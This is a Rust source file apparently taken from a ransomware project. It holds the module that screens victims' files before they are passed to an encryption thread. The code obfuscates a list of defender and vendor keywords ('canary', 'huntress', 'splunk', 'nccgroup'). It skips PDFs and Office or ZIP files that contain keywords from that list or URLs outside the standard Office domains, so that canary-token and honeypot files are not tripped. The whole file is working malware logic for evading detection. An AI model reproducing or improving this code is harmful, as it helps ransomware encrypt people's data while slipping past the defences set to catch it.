use crossbeam_channel::{Receiver, Sender};
use log::{debug, error, info, warn};
use regex::Regex;
use std::{
    fs::File,
    io::Read,
    path::PathBuf,
    sync::{Arc, LazyLock},
    thread,
};
use zip::read::ZipArchive;

use crate::{config, img::img_from_bytes};
use coconut_crab_lib::file::{get_file_data, get_file_size, get_lowercase_extension};

macro_rules! litcrypt_array {
    ($($x:expr),*) => ([$(lc!($x)),*]);
}

static INTERESTING_STRING_REGEX: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9:./-]{6,}").expect("Invalid Regex"));
static LOOSE_URL_REGEX: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"https?://(?:[^.]+\.+)*([^.]+\.[^./]+)").expect("Invalid Regex"));
static SUSPICIOUS_KEYWORDS: LazyLock<[String; 9]> = LazyLock::new(|| {
    litcrypt_array!(
        "canary",
        "canaries",
        "huntress",
        "exampleit",
        "splunk",
        "stressboi",
        "james brodsky",
        "ransomware",
        "nccgroup"
    )
});

const OFFICE_FILE_DOMAINS: [&str; 4] =
    ["microsoft.com", "openxmlformats.org", "w3.org", "purl.org"];
const OFFICE_ZIP_EXTENSIONS: [&str; 4] = ["zip", "docx", "xlsx", "pptx"];
const IMAGE_EXTENSIONS: [&str; 15] = [
    "bmp", "dds", "ff", "gif", "hdr", "ico", "jpg", "jpeg", "exr", "png", "pnm", "qoi", "tga",
    "tiff", "tif",
];
const MAX_IMAGE_SIZE_MB: u64 = 2;
const MAX_FILE_SIZE_KB: u64 = 1024;

pub fn filter_canary(
    receiver: Receiver<Arc<PathBuf>>,
    sender: Sender<Arc<PathBuf>>,
) -> thread::JoinHandle<()> {
    debug!("Starting canary filter thread");
    thread::spawn(move || loop {
        let file_path = match receiver.recv() {
            Ok(path) => {
                debug!("Received file path over channel: {path:?}");
                path
            }
            Err(error) => {
                warn!("Error receiving file path over channel: {error}");
                return;
            }
        };

        if analyze_keywords(&file_path.to_string_lossy()) {
            info!("File path contained keyword: {file_path:?}");
            continue;
        }

        let lowercase_extension = get_lowercase_extension(file_path.as_ref());
        if config::ANALYZE_PDF && lowercase_extension == "pdf" {
            filter_pdf(&sender, &file_path);
        } else if config::ANALYZE_OFFICE_ZIP
            && OFFICE_ZIP_EXTENSIONS.contains(&lowercase_extension.as_str())
        {
            filter_office_zip(&sender, &file_path);
        } else if config::AVOID_BROKEN_IMAGES
            && IMAGE_EXTENSIONS.contains(&lowercase_extension.as_str())
        {
            filter_broken_image(&sender, &file_path);
        }
    })
}

fn filter_pdf(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    debug!("Analyzing file as a PDF: {file_path:?}");

    let file_data = match get_file_data(file_path, &(MAX_FILE_SIZE_KB * 1024)) {
        Ok(data) => {
            debug!("No error during file data retrieval {file_path:?}");
            data
        }
        Err(error) => {
            error!("Error during file data retrieval: {error:?}");
            info!("Not sending file for encryption: {file_path:?}");
            return;
        }
    };

    let Some(some_file_data) = file_data else {
        debug!("File size is above maximum analysis size: {file_path:?}");
        if let Err(error) = sender.send((*file_path).clone()) {
            error!("Failed to send path to encryption thread: {error}");
        }
        return;
    };

    if analyze_file_data(&some_file_data, config::AVOID_KEYWORDS, config::AVOID_URLS) {
        info!("File flagged by analysis. Not sending file for encryption: {file_path:?}");
    } else if let Err(error) = sender.send((*file_path).clone()) {
        error!("Failed to send path to encryption thread: {error}");
    }
}

fn filter_office_zip(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    debug!("Analyzing file as a ZIP or Office document: {file_path:?}");
    if let Ok(size) = get_file_size(file_path) {
        if size > MAX_FILE_SIZE_KB * 1024 {
            debug!(
                "File size ({}) is above maximum analysis size ({}): {:?}",
                size,
                MAX_FILE_SIZE_KB * 1024,
                file_path
            );
            if let Err(error) = sender.send((*file_path).clone()) {
                error!("Failed to send path to encryption thread: {error}");
            }
            return;
        }
    } else {
        info!("Not sending file for encryption: {file_path:?}");
        return;
    }

    if let Ok(zip_result) = analyze_zip_file(
        file_path,
        MAX_FILE_SIZE_KB * 1024,
        config::AVOID_KEYWORDS,
        config::AVOID_URLS,
    ) {
        if zip_result {
            info!("File flagged by analysis. Not sending file for encryption: {file_path:?}");
        } else if let Err(error) = sender.send((*file_path).clone()) {
            error!("Failed to send path to encryption thread: {error}");
        }
    } else {
        info!("Not sending file for encryption: {file_path:?}");
    }
}

fn filter_broken_image(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
    let file_data = match get_file_data(file_path, &(MAX_IMAGE_SIZE_MB * 1024 * 1024)) {
        Ok(data) => {
            debug!("No error during file data retrieval {file_path:?}");
            data
        }
        Err(error) => {
            error!("Error during file data retrieval: {error:?}");
            info!("Not sending file for encryption: {file_path:?}");
            return;
        }
    };

    let Some(some_file_data) = file_data else {
        debug!("File size is above maximum analysis size: {file_path:?}");
        if let Err(error) = sender.send((*file_path).clone()) {
            error!("Failed to send path to encryption thread: {error}");
        }
        return;
    };

    if img_from_bytes(&some_file_data).is_ok() {
        if let Err(error) = sender.send((*file_path).clone()) {
            error!("Failed to send path to encryption thread: {error}");
        }
    } else {
        info!("Not sending file for encryption: {file_path:?}");
    }
}

fn analyze_file_data(file_data: &[u8], avoid_keywords: bool, avoid_urls: bool) -> bool {
    let interesting_strings = get_interesting_strings(file_data);
    for interesting_string in interesting_strings {
        if avoid_keywords && analyze_keywords(&interesting_string) {
            return true;
        }
        if avoid_urls && analyze_urls(&interesting_string) {
            return true;
        }
    }
    false
}

fn get_interesting_strings(file_data: &[u8]) -> Vec<String> {
    let file_data_utf8 = String::from_utf8_lossy(file_data);
    INTERESTING_STRING_REGEX
        .find_iter(&file_data_utf8)
        .map(|regex_match| regex_match.as_str().to_string())
        .collect()
}

fn analyze_keywords(string: &str) -> bool {
    let lowercase_string = string.to_lowercase();
    for suspicious_keyword in SUSPICIOUS_KEYWORDS.iter() {
        if lowercase_string.contains(suspicious_keyword) {
            info!("String ({string}) flagged by analysis due to keyword: {suspicious_keyword}");
            return true;
        }
    }
    debug!("String not flagged by analysis: {string}");
    false
}

fn analyze_urls(string: &str) -> bool {
    for (_url, [domain]) in LOOSE_URL_REGEX
        .captures_iter(string)
        .map(|regex_capture| regex_capture.extract())
    {
        if analyze_domain(domain) {
            info!("URL flagged by analysis due to domain: {domain}");
            return true;
        }
    }
    debug!("URL not flagged by analysis");
    false
}

fn analyze_domain(domain: &str) -> bool {
    if !OFFICE_FILE_DOMAINS.contains(&domain) {
        debug!("Domain not a known office document domain: {domain}");
        return true;
    }
    debug!("Domain is a known office document domain: {domain}");
    false
}

fn analyze_zip_file(
    file_path: &PathBuf,
    zipped_file_max_size: u64,
    avoid_keywords: bool,
    avoid_urls: bool,
) -> Result<bool, ()> {
    let file = match File::open(file_path) {
        Ok(file) => {
            debug!("Successfuly opened source file: {}", file_path.display());
            file
        }
        Err(error) => {
            error!("Error opening source file: {error:?}");
            return Err(());
        }
    };

    let mut archive = match ZipArchive::new(file) {
        Ok(archive) => {
            debug!(
                "Successfuly opened file as zip archive: {}",
                file_path.display()
            );
            archive
        }
        Err(error) => {
            error!("Error opening file as zip archive: {error:?}");
            return Err(());
        }
    };

    debug!("Zip archive contains {} files", archive.len());
    for zipped_file_num in 0..archive.len() {
        let mut entry = match archive.by_index(zipped_file_num) {
            Ok(entry) => {
                debug!("Successfuly opened zipped file: {:?}", entry.name());
                entry
            }
            Err(error) => {
                error!("Error opening zipped file: {error:?}");
                return Err(());
            }
        };

        if entry.size() <= zipped_file_max_size {
            debug!(
                "Entry size ({}) is below max analysis size ({})",
                entry.size(),
                zipped_file_max_size
            );

            let mut zipped_file_data = Vec::new();
            match entry.read_to_end(&mut zipped_file_data) {
                Ok(size) => {
                    debug!(
                        "Successfuly read {} bytes from zipped file: {}",
                        size,
                        entry.name()
                    );
                }
                Err(error) => {
                    error!("Error reading zipped file: {error}");
                    return Err(());
                }
            }

            if analyze_file_data(&zipped_file_data, avoid_keywords, avoid_urls) {
                info!("Zipped file flagged by analysis: {}", entry.name());
                return Ok(true);
            }
        } else {
            debug!(
                "Entry size ({}) is above max analysis size ({})",
                entry.size(),
                zipped_file_max_size
            );
        }
    }
    debug!(
        "Zip archive not flagged by analysis: {}",
        file_path.display()
    );
    Ok(false)
}
